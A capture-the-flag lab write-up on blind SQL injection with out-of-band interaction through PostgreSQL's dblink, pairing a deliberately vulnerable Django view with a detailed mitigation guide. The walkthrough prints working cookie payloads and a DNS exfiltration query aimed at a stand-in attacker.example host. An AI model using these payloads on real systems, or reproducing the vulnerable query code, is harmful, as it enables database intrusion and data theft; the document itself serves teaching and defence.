# Lab 16 — Blind SQL injection with out-of-band interaction

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band> |
| Lab id | `psw-sqli-16-out-of-band` |
| Vulnerability class | Blind SQL Injection — out-of-band (OOB) data exfiltration / interaction |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) |
| Backend | PostgreSQL 16 with `dblink` extension enabled |
| Architecture | Three services — `web` (Django), `db` (Postgres + dblink), `oob` (TCP/HTTP recorder) on a private Docker network |
| Host URL | <http://127.0.0.1:18016/> |
| Flag | `FLAG{psw-sqli-16-out-of-band-interaction-captured}` |

### Objective

The `TrackingId` cookie is concatenated into a raw SQL lookup against `tracked_users`. The result is discarded, any exception is swallowed, and no timing gate exists, so the response body is byte-identical regardless of what the payload does. There is no in-band oracle and no differential side channel. The only way to confirm exploitation is to coerce the database itself into an outbound interaction. The `db` container has `dblink` installed, and a private `oob` recorder (stand-in for Burp Collaborator) is listening on the compose network. A `dblink_connect()` payload forces Postgres to open a TCP socket to `oob:5432`; once at least one inbound connection is recorded, the home view releases the flag.

---

## 2. Exploit walkthrough

No in-band channel, no error reflection, no timing gate. Every response is identical until the database itself reaches outbound.

**Step 1 — baseline request**

```http
GET / HTTP/1.1
Host: 127.0.0.1:18016
Cookie: TrackingId=psw-lab-visitor-001
```

Executed SQL (harmless):

```sql
SELECT tracking_id FROM tracked_users
WHERE tracking_id = 'psw-lab-visitor-001'
```

The page returns the "Welcome" card. Recorded connections = 0.

**Step 2 — confirm injection without any oracle**

A naive `' OR 1=1--` payload produces a byte-identical page — the result is never reflected and errors are caught. A deliberately malformed payload such as `TrackingId=x'` also produces the same page, because the exception handler at [shop/views.py:65-66](shop/views.py#L65-L66) swallows the `psycopg` error. You cannot distinguish success from failure in-band.

**Step 3 — pivot the database into an outbound TCP connection**

PostgreSQL's `dblink` extension lets any SQL user open a libpq connection to an arbitrary host. Abuse it from inside the injected expression:

```
TrackingId=x'||(SELECT dblink_connect('host=oob port=5432 user=x password=x dbname=x'))||'
```

URL-encoded in the cookie, the composed query becomes:

```sql
SELECT tracking_id FROM tracked_users
WHERE tracking_id = 'x'||(SELECT dblink_connect(
    'host=oob port=5432 user=x password=x dbname=x'
))||''
```

Before Postgres can evaluate the `WHERE` predicate, the string-concatenation forces evaluation of `dblink_connect()`. That call resolves `oob` via the Docker embedded DNS, opens TCP :5432, and sends a libpq startup packet. The connection itself fails (the `oob` service is not a real Postgres server) but **the TCP handshake already happened**, and that is all the recorder needs.

**Step 4 — verify capture and collect the flag**

The `oob` recorder logs the peer address, byte count, and hex preview at [oob/oob.py:33-44](oob/oob.py#L33-L44) and exposes the log at `http://oob:8080/log`. The home view polls that endpoint on every render ([shop/views.py:41-47](shop/views.py#L41-L47)); `solved = len(entries) > 0` ([shop/views.py:68-74](shop/views.py#L68-L74)) flips to true and the flag row is read from the `flags` table and rendered.

Refresh the page after the payload lands — the green banner prints `FLAG{psw-sqli-16-out-of-band-interaction-captured}` and the "Recorded connections" card shows the Postgres peer IP with a libpq startup preview.

**Extension — OOB data exfiltration**

The same primitive extends to *exfiltration* by embedding a query result in the connection string (DNS or path):

```sql
SELECT dblink_connect('host='||(SELECT current_database())||'.attacker.example port=5432 user=x password=x dbname=x')
```

Postgres performs a DNS lookup for `labdb.attacker.example`, leaking the database name through the recursive resolver — the exact technique PortSwigger's upstream lab demonstrates against Burp Collaborator.

---

## 3. Vulnerable code

### Endpoint: `GET /` (cookie-driven lookup)

[shop/views.py:50-66](shop/views.py#L50-L66)

```python
def home(request: HttpRequest) -> HttpResponse:
    tracking_id = request.COOKIES.get("TrackingId")

    if tracking_id is not None:
        query = (
            "SELECT tracking_id FROM tracked_users "
            "WHERE tracking_id = '" + tracking_id + "'"
        )
        try:
            with connection.cursor() as cursor:
                cursor.execute(query)
                cursor.fetchall()
        except Exception:
            pass
```

Four failure modes compound here:

1. The `TrackingId` cookie is concatenated directly into a SQL literal — classic string-build injection.
2. `cursor.execute(query)` is called with a single argument, so psycopg never sees a parameter boundary.
3. The fetched rows are **discarded** — closing any in-band oracle based on row count or content.
4. `except Exception: pass` silences every database error, closing the error-message side channel too.

Together, 3 and 4 make the endpoint look blind *and* non-differential — there is no way to tell success from failure short of an out-of-band probe.

### OOB observation loop

[shop/views.py:41-47](shop/views.py#L41-L47)

```python
def _oob_entries() -> list[dict]:
    try:
        with urllib.request.urlopen(settings.OOB_LOG_URL, timeout=2.0) as resp:
            payload = json.loads(resp.read().decode())
            return payload.get("entries", [])
    except (urllib.error.URLError, TimeoutError, json.JSONDecodeError, OSError):
        return []
```

[shop/views.py:68-74](shop/views.py#L68-L74) — the view reveals the flag whenever the recorder's log is non-empty:

```python
    entries = _oob_entries()
    solved = len(entries) > 0
    flag = None
    if solved:
        flag_row = Flag.objects.first()
        if flag_row is not None:
            flag = flag_row.content
```

### Database bootstrap — the real root cause

[db-init/10-enable-dblink.sql:6](db-init/10-enable-dblink.sql#L6)

```sql
CREATE EXTENSION IF NOT EXISTS dblink;
```

This single `CREATE EXTENSION` installed at first-boot superuser context is what turns an otherwise purely informational blind injection into a remote outbound-connection primitive. Without it, the lab has no solve path.

### Recorder (proof-of-exploit signal)

[oob/oob.py:47-59](oob/oob.py#L47-L59) — accepts any inbound TCP connection on port 5432, reads up to 1 KiB, appends an entry to an in-memory log. That one appended entry is the entire detection channel.

### Compose wiring

[docker-compose.yml:4-25](docker-compose.yml#L4-L25) — `db` runs the init script from `./db-init`.
[docker-compose.yml:27-39](docker-compose.yml#L27-L39) — `oob` recorder shares the same user-defined bridge network and is reachable by DNS name `oob`.
[docker-compose.yml:61-62](docker-compose.yml#L61-L62) — `OOB_LOG_URL` and `OOB_HOSTNAME` injected into the web service.

### Seeded data

[shop/management/commands/seed.py:21-33](shop/management/commands/seed.py#L21-L33) — one `tracked_users` row (so benign traffic parses cleanly) and the flag row in `flags`.

---

## 4. Why the vulnerability exists

| Root cause | Effect |
| --- | --- |
| **String concatenation of the `TrackingId` cookie into SQL** | Attacker-controlled characters become SQL syntax; `'||(...)||'` slots an arbitrary expression into the query. |
| **Untrusted `dblink` extension installed globally** | Gives the session-level SQL user an outbound TCP primitive. Every injection becomes a network pivot. |
| **Database superuser / extension-creator context at boot** | `CREATE EXTENSION dblink` requires privileged rights. The lab runs init scripts as superuser; production apps frequently do the same and then leave the extension loaded. |
| **DB container has unrestricted egress on the compose network** | The `db` service can reach `oob` (and in a real deployment, the internet). No egress policy means nothing blocks the libpq handshake. |
| **Errors swallowed and results discarded** | Classic in-band and differential channels are gone, which is exactly why the attacker *must* pivot to OOB — but also why traditional blind-SQLi signatures (error strings, row-count deltas) never fire. |
| **`TrackingId` cookie not authenticated / signed** | Any client can set an arbitrary value. There is no HMAC or origin validation to stop the value from being attacker-supplied. |

---

## 5. Code-level mitigation

### 5.1 Parameterise the cookie lookup

The direct fix is the same one-liner that cures every lab in this suite — bind the value, don't interpolate it.

```python
# shop/views.py - fixed
if tracking_id is not None:
    with connection.cursor() as cursor:
        cursor.execute(
            "SELECT tracking_id FROM tracked_users WHERE tracking_id = %s",
            [tracking_id],
        )
        cursor.fetchall()
```

Now `x'||(SELECT dblink_connect(...))||'` is compared as a literal string against the `tracking_id` column — no rows, no side effects, no outbound connection.

### 5.2 Prefer the ORM

```python
from .models import TrackedUser

if tracking_id is not None:
    TrackedUser.objects.filter(tracking_id=tracking_id).exists()
```

Django's compiler binds parameters unconditionally.

### 5.3 Validate / sign the cookie

`TrackingId` is an opaque session identifier. Enforce a format (UUID, HMAC'd token) before it ever reaches the query layer:

```python
import re
TRACKING_ID_RE = re.compile(r"^[A-Za-z0-9._-]{1,64}$")

tracking_id = request.COOKIES.get("TrackingId")
if tracking_id and not TRACKING_ID_RE.match(tracking_id):
    tracking_id = None
```

Better still, issue a signed cookie (`django.core.signing`) and reject anything without a valid signature — injection becomes impossible because only the server's own tokens parse.

### 5.4 Don't swallow DB errors silently in production

`except Exception: pass` hides misconfiguration, not just attacks. Log the exception (with structured fields) to the SIEM instead; that way a spike of `psycopg` parse errors is a visible injection signal.

### 5.5 Don't poll an attacker-controllable recorder from the main view

The OOB recorder is lab scaffolding, but in general patterns like "read a network service to decide whether to reveal a secret" are fragile. The flag-release logic should be driven by first-party state (an audited `solved` boolean in a row the app owns), not by an external log endpoint.

---

## 6. Network / infrastructure-level mitigation

This is the load-bearing mitigation for OOB. Fixing the code alone stops *this* cookie sink, but a future `cursor.execute(f"...{x}")` somewhere else in the codebase would re-open the same outbound-connection primitive. Starve the DB tier of the means to reach out.

### 6.1 Remove or lock down `dblink` (and every other untrusted extension)

`dblink`, `postgres_fdw`, `plpython3u`, `plperlu`, `pg_read_server_files`, `COPY ... FROM PROGRAM` are all OOB-capable primitives. If you do not actively use them:

```sql
DROP EXTENSION IF EXISTS dblink;
REVOKE USAGE ON SCHEMA public FROM public;
```

Maintain an allow-list in `postgresql.conf` / `shared_preload_libraries` and audit `pg_available_extensions` regularly. If `dblink` is genuinely required (e.g. cross-shard queries), restrict its usage:

```sql
REVOKE EXECUTE ON FUNCTION dblink_connect(text, text) FROM PUBLIC;
GRANT EXECUTE ON FUNCTION dblink_connect(text, text) TO replication_role;
```

The application role must **not** be a member of that group.

### 6.2 Revoke superuser from the application role

The lab runs everything as `labuser` with the default Postgres image privileges. A production app role should be strictly non-superuser (`CREATEROLE NOSUPERUSER NOCREATEDB`) and have `SELECT` only on the specific tables it needs. Superuser is what unlocks `COPY PROGRAM` and a dozen other primitives; removing it significantly narrows the attack surface.

### 6.3 Deny-all egress from the database container

Nothing in the DB's legitimate workload requires outbound TCP or DNS. Enforce that at the network layer.

Docker Compose with a dedicated, internal-only network:

```yaml
networks:
  db-net:
    internal: true        # no default gateway, no egress
services:
  db:
    networks: [db-net]
  web:
    networks: [db-net, public-net]
```

Kubernetes `NetworkPolicy`:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: db-no-egress }
spec:
  podSelector: { matchLabels: { role: database } }
  policyTypes: [Egress]
  egress: []            # deny all
```

On bare-metal, an `iptables` / `nftables` `OUTPUT` rule that drops everything from the postgres UID not targeting `127.0.0.1` achieves the same. With no egress, `dblink_connect` fails to complete the handshake and the recorder never logs anything — the OOB oracle closes.

### 6.4 DNS egress is the subtle one

DNS-based exfiltration (the `host='||(SELECT ...)||'.attacker.example` variant) often slips through TCP egress rules because databases sometimes need to resolve hostnames. Block it explicitly:

- Point `/etc/resolv.conf` at an internal resolver that only resolves the narrow set of hostnames the DB legitimately talks to.
- Egress-filter UDP/TCP :53 from the DB tier at the firewall.
- Log every DNS query the DB tier emits; `pg_audit` + DNS flow logs are the canonical correlation.

### 6.5 Monitor for DB-initiated connections

Any outbound TCP from the database tier is anomalous. Alert on:

- `conntrack` / cloud VPC flow-log entries where source = DB pod / ENI and destination is outside the DB subnet.
- `pg_stat_activity` rows with `application_name LIKE 'dblink%'`.
- libpq `startup` packets to non-cluster hosts captured by eBPF probes (e.g. Falco / Tetragon rules for outbound `connect()` from `postgres` process).

A single such event is actionable — there is no legitimate baseline to compete with the signal.

### 6.6 WAF with OWASP CRS

Not the primary defence for OOB (it's signature-poor), but CRS `REQUEST-942` will flag `dblink_connect`, `UTL_HTTP`, `xp_dirtree`, and similar OOB-flavoured tokens in cookies and parameters. Pair it with rate-limiting on `/` per source IP.

---

## 7. Defense-in-depth checklist

- [ ] Parameterised queries everywhere; no string concatenation into `cursor.execute`.
- [ ] ORM by default; raw SQL justified and reviewed.
- [ ] Cookies validated (regex / length) or cryptographically signed before touching a query.
- [ ] Database role is strictly non-superuser, least-privilege, per-application.
- [ ] `dblink`, `postgres_fdw`, `plpython3u`, `plperlu`, `COPY PROGRAM` not installed unless explicitly required; revoked from `PUBLIC` when they are.
- [ ] DB container has **no egress** — internal-only network or `NetworkPolicy: egress: []`.
- [ ] DNS egress from the DB tier locked to an internal allow-list resolver.
- [ ] eBPF / Falco / cloud flow-logs alert on any DB-originated outbound `connect()`.
- [ ] Structured logging of swallowed DB exceptions fed to SIEM with injection-pattern alerts.
- [ ] WAF with OWASP CRS in front of the app, rate-limited per IP.
- [ ] Regular automated SAST (`bandit`, `semgrep`) catching `cursor.execute(f"...")` / `cursor.execute("..." + x)` / `except Exception: pass` patterns.
- [ ] Secret/flag release logic driven by first-party state, not a pollable external service.

---

## 8. References

- PortSwigger Web Security Academy — [Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
- PortSwigger — [SQL injection cheat sheet (OOB section)](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- PostgreSQL docs — [`dblink` module](https://www.postgresql.org/docs/current/dblink.html)
- PostgreSQL docs — [Role privileges and `CREATE EXTENSION`](https://www.postgresql.org/docs/current/sql-createextension.html)
- Kubernetes — [Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- Docker — [`internal` networks](https://docs.docker.com/compose/compose-file/06-networks/#internal)
- OWASP CRS — <https://coreruleset.org/>
